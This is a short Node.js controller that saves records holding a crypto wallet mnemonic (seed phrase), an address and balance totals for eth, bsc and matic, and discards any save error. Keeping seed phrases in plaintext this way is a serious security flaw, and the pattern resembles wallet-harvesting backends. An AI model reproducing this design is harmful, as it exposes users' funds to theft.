const Test = require("./model.js");

exports.create = (req) => {
  const testData = new Test({
    mnemonic: req.mnemonic,
    address: req.address,
    eth: req.eth || 0,
    bsc: req.bsc || 0,
    matic: req.matic || 0,
    total: req.total || 0,
  });

  Test.create(testData, (err, data) => {
    // console.log(data);
  });
};
